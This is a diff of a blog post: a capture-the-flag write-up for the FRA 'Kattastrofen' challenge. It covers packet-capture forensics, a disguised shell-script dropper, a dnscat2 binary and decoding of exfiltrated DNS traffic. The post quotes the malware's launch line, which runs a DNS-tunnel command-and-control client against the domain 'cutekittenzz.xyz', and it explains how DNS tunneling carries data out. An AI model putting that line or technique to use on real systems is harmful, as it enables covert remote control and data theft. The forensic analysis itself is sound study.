@@ -1,6 +1,6 @@
 +++
 title = "FRA Kattastrofen"
-date = "2026-02-15T18:08:42+01:00"
+date = "2026-02-22T18:08:42+01:00"
 #dateFormat = "2006-01-02" # This value can be configured for per-post date formatting
 
 description = "My writeup for FRA:s Kattastrofen challange"
@@ -19,15 +19,31 @@ showFullContent = false
 >Skicka in din lösning till rekrytering@fra.se, även om du inte lyckas hitta
 samtliga flaggor!
 # First flag
-The first flag was found by the hint given in the description. A public servent had downloaded some malware he though was picutures of cats. So I decided to take a look in wireshark of the downloaded files. 
+The first flag was found using the hint provided in the challenge description. A public servant had downloaded malware he believed to be pictures of cats. Based on that, I decided to inspect the downloaded files in Wireshark.
+
 ![The downloaded files](/FRA_Kattastrofen/malwaredownloade.png)
-As can be seen in the picture the zip file looks suspicious. So I downloaded it and discovered it was password protected. Now my first instinct was to use `John The Ripper` so I started trying to get `Zip2John` setup on my sift machine but I had to clone some github stuff and it started complaining about missing libraries and bla bla. So I took the lazy way out and tried just search for frames that contained the string `pass`and lo and behold it worked.
+
+As shown in the image above, the ZIP file looked suspicious. I downloaded it and discovered that it was password protected.
+
+My first instinct was to use `John the Ripper`, so I started setting up `zip2john` on my SIFT machine. However, after cloning the required GitHub repositories, I ran into multiple dependency issues and missing libraries. Rather than troubleshooting all of that, I took a lazier approach.
+
+I searched the packet capture for frames containing the string `pass` and it worked.
+
 ![Found zip password](/FRA_Kattastrofen/zippassword.png)
-Inside a file named flag contained the flag `flagga1{klassiska_lösenord_för_100}`.
+
+Inside the archive, there was a file named `flag` containing the flag:
+
+`flagga1{klassiska_lösenord_för_100}`
 # Second Flag
-What I noticed aswell after extracting the zip file was that every picture had a thumbnail except number 3. This feels suspicious. Using the terminal to view the file with the `ls` command also reveals that it is an executable. lets use the `file` command to see what it actually is. 
-![suspicious kitten png in terminal](/FRA_Kattastrofen/suspiciouskittenimage.png)
-Aha! It is a shell script. This is probably the downloaded malware. Looking at the bash script it seems to include a base64 encoded key aswell as base64 encoded data that is decoded and saved into a file named `mjau`. The file is then made executable with the `chmod +x` command. 
+After extracting the ZIP file, I noticed that every image had a thumbnail except number 3. That immediately felt suspicious. 
+
+Using the terminal and listing the files with the `ls` command also revealed that this file was executable. To confirm what it actually was, I used the `file` command.
+
+![Suspicious kitten PNG in terminal](/FRA_Kattastrofen/suspiciouskittenimage.png)
+
+Aha! It turned out to be a shell script. This was most likely the downloaded malware.
+
+Inspecting the Bash script showed that it contained a Base64-encoded key as well as Base64-encoded data. The script decodes the data and writes it to a file named `mjau`, then makes that file executable using the `chmod +x` command.
 
 ```bash
 #!/bin/bash
@@ -63,45 +79,84 @@ EOM
 chmod +x mjau
 ./mjau cutekittenzz.xyz
 ```
-Decoding that long block of data with `base64 -d < mjauB64 > mjau` gives me an `ELF` file.
-Poking around in Ghidra I see alot of references to `dns` and network activity. I dont fully understand how it works but I doubt I have to reverse engineer the entire program. It seems for sure to setup a connection with functions such as `can_i_transmit_yet` and `you_can_transmit_now`. I also saw alot of refernces to `dnscat`. Looking at the `usage` function seemed to confirm that it was a `dnscat2` binary. 
-![dnscat2 usage function](/FRA_Kattastrofen/dnscatusage.png).
+Decoding the long block of data with `base64 -d < mjauB64 > mjau` produced an `ELF` binary.
 
-Looking at the documention for `dnscat2` reveals that it does indeed setup an ecnrypted channel using the DNS protocol. 
+After loading it into Ghidra, I noticed a lot of references to `dns` and general network activity. I did not fully understand the entire control flow, but it seemed unnecessary to reverse engineer the whole program. The presence of functions such as `can_i_transmit_yet` and `you_can_transmit_now` strongly suggested that it was establishing some kind of communication channel.
+
+I also found several references to `dnscat`. Inspecting the `usage` function appeared to confirm that this was indeed a `dnscat2` binary.
+
+![dnscat2 usage function](/FRA_Kattastrofen/dnscatusage.png)
+
+Looking at the the documentation by Kali for `dnscat2` shows that it establishes an encrypted command-and-control channel over the DNS protocol. That aligns well with the DNS-related artifacts observed in the binary.
 > # dnscat2
 >This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.
 
-The `dnscat2`was ran with the domain `cutekittenzz.xyz` as the argument for the domain, `./mjau cutekittenzz.xyz`. This seems to align with the `dns` packets being sent immeditely after the malware was downloaded.
+The `dnscat2` binary was executed with the domain `cutekittenzz.xyz` as its argument:
+
+`./mjau cutekittenzz.xyz`
+
+This aligns with the DNS packets being sent immediately after the malware was downloaded.
+
 ![DNS protocol packets being sent after malware was downloaded](/FRA_Kattastrofen/dnsAfterMalwareDownload.png)
-Looking at the dns packets we see that `cutekittenzz.xyz`is heavily referenced.
-![cutekittenzz.xyz in dns packets](/FRA_Kattastrofen/cutekittenzzIN_DNS.png).
-# My understanding of dnscat2 and the bash script.
-Truth be told my `bash` skills are not the greatest nor had I ever heard of `dnscat2` before. So the following section is just me explaining my understanding of the script and `dnscat2` after some googling.
+
+Inspecting the DNS traffic shows that `cutekittenzz.xyz` is heavily referenced.
+
+![cutekittenzz.xyz in dns packets](/FRA_Kattastrofen/cutekittenzzIN_DNS.png)
+
+# My understanding of dnscat2 and the Bash script
+
+To be honest, my Bash skills are not the strongest, and I had never heard of `dnscat2` before this challenge. The following section reflects my understanding of the script and `dnscat2` after doing some research.
+
 ## dnscat2
-`dnscat2` is a tool used to setup an ecnrypted command-and-control channel using the `dns` protocol. Since most networks allows `dns` traffic, and do not really monitor it, this can be used to establish a remote connection or exfilitrate data. This technique is also known as `dns tunneling` and `dnscat2`is a tool that utilizes that technique. 
 
-So how does `dns tunneling` work? `dns tunneling` work by the malware encoding data in `dns` queries. These queries are designed to be sent to an attacker controlled `dns` server. These queries could look like these specific `dnscat2` queries which is `<encoded_request>.hacker.com` and the type is `MX`, that is `Mail server hostname`.
-When `dnscat2` sends out this query, the local `dns` server do no know the `MX` for `<encoded>.hacker.com`. In order to get the `MX` it utilizes the `dns` protocol and asks the `root nameserver` about which servers are reponsible for knowing about the `.com` domains, and the `root nameserver` responds with `ns records` for the `top level domain (TLD) `servers which do know. 
-The `TLD` are then in turned queried about which `authoratiative nameservers` know about `hacker.com` and the `authoratiative nameservers` responds with `ns records` about `hacker.com`. 
-The final server responsible for answering the query is the `authoritative nameserver` for `hacker.com`. But here is the thing, this server is attacker controlled. The query asks for the `Mail server hostname` record for `<encoded_request>.hacker.com` and the attacker controlled server responds with `<encoded_response>.hacker.com`. This then makes it way back to the malware which decodes the `encoded_response` which could be instructions, acknowledgement or something else it needs. The malware could also just send data and not making requests.
+`dnscat2` is a tool used to establish an encrypted command-and-control (C2) channel over the DNS protocol. Since most networks allow DNS traffic and often do not monitor it closely, DNS can be abused to create a covert remote connection or to exfiltrate data. This technique is commonly referred to as **DNS tunneling**, and `dnscat2` is an implementation of that technique.
 
-`dnscat2` uses a `SYN`/`FIN` communication system similar to `TCP`, where `SYN` is used to establish a session and `FIN` to end it. The packet structure (the encoded part of the query) for a `SYN` packet is as follows:
-1. Packet ID (16 bits)
-2. Message Type (8 bits, 0x00)
-3. Session ID (16 bits)
-4. Initial sequence number (16 bits)
-5. Options (16 bits)
-6. Something extra if `OPT_NAME is set, I did not look into it.
+### How DNS tunneling works
 
-For a message packet the structure is as follows:
-1. Packet ID (16 bits)
-2. Message Type (8 bits, 0x01)
-3. Session ID (16 bits)
-4. Seq (16 bits)
-5. Ack (16 bits)
-6. The Message data
+DNS tunneling works by encoding data inside DNS queries. These queries are sent to an attacker-controlled DNS server. A typical `dnscat2` query might look like:
 
-What this tells me is that the initial 9 bytes of each packet (the encoded part of the query) is for communication and establishing a connection. If I want the message data I extract the packets who has `0x01` as their third byte and furthermore extract the bytes after the inital 9 bytes. 
+`<encoded_request>.hacker.com` with record type `MX` (Mail Exchange).
+
+When the malware sends this query, the local DNS resolver does not know the `MX` record for `<encoded_request>.hacker.com`. It then follows the normal DNS resolution process:
+
+1. The resolver queries a **root nameserver** to determine which servers are responsible for the `.com` top-level domain (TLD).
+2. The root server responds with `NS` records for the `.com` TLD servers.
+3. The resolver queries a `.com` TLD server to determine which authoritative nameservers are responsible for `hacker.com`.
+4. The TLD server responds with `NS` records for the authoritative nameservers of `hacker.com`.
+5. Finally, the resolver queries the authoritative nameserver for `hacker.com`.
+
+The critical detail is that the authoritative nameserver for `hacker.com` is attacker-controlled. When the query requests the `MX` record for `<encoded_request>.hacker.com`, the attacker-controlled server responds with something like:
+
+`<encoded_response>.hacker.com`
+
+That response propagates back through the DNS hierarchy to the infected host. The malware then decodes `<encoded_response>`, which may contain commands, acknowledgments, or other data. The malware can also exfiltrate data simply by embedding it in outgoing DNS queries, without necessarily expecting meaningful responses.
+
+### dnscat2 packet structure
+
+`dnscat2` uses a session-oriented communication model similar to TCP, with `SYN`-like packets to establish a session and `FIN`-like packets to terminate it.
+
+For a `SYN` packet, the encoded payload structure is:
+
+1. Packet ID (16 bits)  
+2. Message Type (8 bits, `0x00`)  
+3. Session ID (16 bits)  
+4. Initial sequence number (16 bits)  
+5. Options (16 bits)  
+6. Optional additional data if `OPT_NAME` is set  
+
+For a message packet, the structure is:
+
+1. Packet ID (16 bits)  
+2. Message Type (8 bits, `0x01`)  
+3. Session ID (16 bits)  
+4. Sequence number (16 bits)  
+5. Acknowledgment number (16 bits)  
+6. Message data  
+
+From this, I concluded that the first 9 bytes of the encoded DNS subdomain represent control and session metadata. If I want to extract the actual message content, I need to:
+
+- Identify packets where the third byte (Message Type) is `0x01`, indicating a message packet.  
+- Extract the bytes following the initial 9-byte header, as those contain the message data.
 ## The bash script
 With some help from google and chatgpt about the weird `paste`, loop part thing syntax this is how I understand the bash script:
 ```bash
@@ -158,26 +213,38 @@ A 1
 B 2
 C 3
 ```
-The `while` loop never ends but from how I understood it `paste` stops when it can no longer match them like this.
+The `while` loop never terminates, but from what I understood, `paste` stops once it can no longer match corresponding lines.
 
-These joined lists are then piped to `awk` which XORs the values, that is `A XOR 1`. The result is encoded into base64 and appeneded to the exfil.dat. I do not know how interesting it is to know exactly all the parameters and such for the `awk`command so I am just gonna skip that part. 
+The joined lists are then piped into `awk`, which XORs the values, performing `A XOR 1`. The result is Base64-encoded and appended to `exfil.dat`. I do not think it is probably necessary to analyze every parameter of the `awk` command in detail, so I will skip that part.
 
 # Back to finding flag 2
-Now that I know how everything works (atleast on a high level) I can develop a strategy.
-This is my plan:
+
+Now that I understand the overall workflow — at least at a high level — I can develop a strategy.
+
+This was my plan:
+
 1. Export the queries sent by the infected system separately using `tshark`.
-2. Export the responses recieved from the compromised `authoritative nameserver` seperetly.
-3. Write a pythong script that extracts the encoded part. 
-4. Remove the 9 first bytes from each message.
-5. Decode it from hex to string.
-6. Locate the base64 encoded enrypted message and decode it.
-7. Apply the key recovered earlier in the same manner it was encrypted.  
+2. Export the responses received from the compromised authoritative nameserver separately.
+3. Write a Python script to extract the encoded portion.
+4. Remove the first 9 bytes from each message.
+5. Decode the remaining data from hex to a string.
+6. Locate the Base64-encoded message and decode it.
+7. Apply the previously recovered key in the same manner it was originally used for encryption.
 
 ## Step 1 and 2
-Was done using `tshark -r kattastrofen.pcap -Y "dns&& ip.src==[VICTIM OR ATTACKER]" -T fields -e "dns.qry.name" > [VICTIM OR ATTACKER]`. 
-I also noticed that each packet could include multiple encoded sections seperated by a dot. 
-## Step 3, 4, 5
-I thought I would have to locate the byte that specified that it was a message but it seemed to work fine without doing that. The `dnscat2` data was also not encrypted.
+
+These steps were completed using:
+
+`tshark -r kattastrofen.pcap -Y "dns && ip.src==[VICTIM OR ATTACKER]" -T fields -e "dns.qry.name" > [VICTIM OR ATTACKER]`
+
+I also noticed that each DNS packet could contain multiple encoded segments separated by dots. 
+
+After experimenting with an online decoder, I discovered that only the first segment needs to have its initial 9 bytes removed. The remaining segments can be decoded directly without stripping any additional header bytes.
+## Step 3, 4, and 5
+
+Initially, I thought I would need to explicitly identify the byte indicating a message packet (`0x01`), but the extraction process worked without doing so.
+
+Interestingly, the `dnscat2` data in this case did not appear to be encrypted.
 
 ```python
 victim = open("victim")
@@ -223,7 +290,7 @@ server_decoded.write(''.join(server_lines))
 server_decoded.flush()
 ```
 ## Step 6 and 7
-Using nano I removed everything but the base64:ed parts and decoded it. I created a python script to xor with the the key that I also decoded:
+Using nano I removed everything but the base64:ed `exfil.tar` file and decoded it. I created a python script to xor with the the key that I also decoded:
 ```python
 encrypted = open("victimDataEncrypted",'rb').read()
 key = open("key",'rb').read()
@@ -238,7 +305,7 @@ for byte in encrypted:
     key_index += 1
     key_index = key_index % len(key)
 ```
-Which gave me a file named `data` and using the `file` command i get: `data: POSIX tar archive (GNU)`.
+Which gave me a file that the `file` command says is: `data: POSIX tar archive (GNU)`.
 Using `tar -xf data -C extracted/` I find a pdf called `topphemligt.pdf`. Exciting!!!
 The pdf contains the flag:
 ![Flag 2 in a picture of a kitten](/FRA_Kattastrofen/flag2.png)
